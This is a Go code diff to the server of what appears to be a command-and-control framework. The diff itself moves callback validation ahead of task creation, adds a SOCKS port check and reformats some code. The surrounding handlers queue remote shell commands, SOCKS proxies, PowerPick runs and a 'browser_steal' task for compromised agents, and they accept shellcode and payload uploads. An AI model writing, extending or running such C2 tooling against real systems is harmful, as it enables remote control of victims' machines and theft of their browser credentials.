@@ -129,14 +129,8 @@ func (s *Server) handleSendCommand(c *gin.Context) {
 		return
 	}
 
-	task, err := s.createTask(id, "shell", cmd, shell, "", "", 0, 0)
-	if err != nil {
-		slog.Error("Failed to create task", "agent_id", id, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
-		return
-	}
-
-	// Set callback fields if provided
+	// Validate callback fields BEFORE creating the task so a rejected request
+	// never leaves a pending task that the agent would execute anyway.
 	if callbackURL != "" {
 		if err := validateCallbackURL(callbackURL); err != nil {
 			respondError(c, http.StatusBadRequest, "invalid callback URL")
@@ -146,6 +140,17 @@ func (s *Server) handleSendCommand(c *gin.Context) {
 			respondError(c, http.StatusBadRequest, "invalid callback method")
 			return
 		}
+	}
+
+	task, err := s.createTask(id, "shell", cmd, shell, "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create task", "agent_id", id, "error", err)
+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return
+	}
+
+	// Set callback fields if provided
+	if callbackURL != "" {
 		if err := s.db.Model(&task).Updates(map[string]interface{}{
 			"callback_url":    callbackURL,
 			"callback_method": callbackMethod,
@@ -765,6 +770,10 @@ func (s *Server) handleSocks(c *gin.Context) {
 	if port == "" {
 		port = "1080"
 	}
+	if n, err := strconv.Atoi(port); err != nil || n < 1 || n > 65535 {
+		respondError(c, http.StatusBadRequest, "invalid port (1-65535)")
+		return
+	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
@@ -1049,9 +1058,9 @@ func (s *Server) handlePowerPick(c *gin.Context) {
 // 鈹€鈹€ Browser Data Theft 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleBrowserSteal(c *gin.Context) {
 	s.createOneParamTask(c, oneParamTaskDef{
-		taskType:     "browser_steal",
-		audit:        "browser_steal",
-		defaultValue: "all",
+		taskType:      "browser_steal",
+		audit:         "browser_steal",
+		defaultValue:  "all",
 		auditDetailFn: func(val string) string { return "Browser steal: " + val },
 	})
 }
@@ -1342,10 +1351,10 @@ func (s *Server) createSimpleTask(c *gin.Context, id string, def simpleTaskDef) 
 type oneParamTaskDef struct {
 	taskType      string
 	audit         string
-	paramField1   string // primary form field name (empty = "command")
-	paramField2   string // fallback form field name (empty = "target")
-	defaultValue  string // used when both fields are empty
-	required      bool   // if true, return 400 when empty
+	paramField1   string                  // primary form field name (empty = "command")
+	paramField2   string                  // fallback form field name (empty = "target")
+	defaultValue  string                  // used when both fields are empty
+	required      bool                    // if true, return 400 when empty
 	auditDetailFn func(val string) string // optional custom detail formatter (nil = use raw value)
 }
 
@@ -1412,12 +1421,12 @@ func validateCommandArg(v string, maxLen int, field string) error {
 // allowedUploadExtensions maps field names to their allowed file extensions.
 // This prevents arbitrary file uploads that could be used as attack vectors.
 var allowedUploadExtensions = map[string][]string{
-	"shellcode":  {".bin", ".raw", ".dat", ".sc", ".exe", ".dll", ".c", ".txt"},
-	"assembly":   {".exe", ".dll", ".csproj", ".zip", ".txt"},
-	"bof":        {".o", ".bin", ".dat", ".txt"},
-	"file":       {".txt", ".csv", ".json", ".xml", ".log", ".ps1", ".bat", ".cmd", ".vbs", ".js", ".py", ".rb", ".sh", ".c", ".h", ".bin"},
-	"payload":    {".exe", ".dll", ".ps1", ".sh", ".bin", ".dat"},
-	"config":     {".yaml", ".yml", ".json", ".xml", ".ini", ".conf", ".toml"},
+	"shellcode": {".bin", ".raw", ".dat", ".sc", ".exe", ".dll", ".c", ".txt"},
+	"assembly":  {".exe", ".dll", ".csproj", ".zip", ".txt"},
+	"bof":       {".o", ".bin", ".dat", ".txt"},
+	"file":      {".txt", ".csv", ".json", ".xml", ".log", ".ps1", ".bat", ".cmd", ".vbs", ".js", ".py", ".rb", ".sh", ".c", ".h", ".bin"},
+	"payload":   {".exe", ".dll", ".ps1", ".sh", ".bin", ".dat"},
+	"config":    {".yaml", ".yml", ".json", ".xml", ".ini", ".conf", ".toml"},
 }
 
 // validateUploadExtension checks whether the file extension is allowed for the given field.
@@ -1445,7 +1454,7 @@ func validateUploadMagicBytes(fieldName, filename string, data []byte) error {
 	}
 	// Reject PE executables uploaded as shellcode/bof (should be raw bytes)
 	dangerous := map[string][]string{
-		"shellcode": {"MZ", "PK"},  // .exe, .zip disguised as shellcode
+		"shellcode": {"MZ", "PK"}, // .exe, .zip disguised as shellcode
 		"bof":       {"MZ", "PK"},
 		"assembly":  {"PK"},
 	}
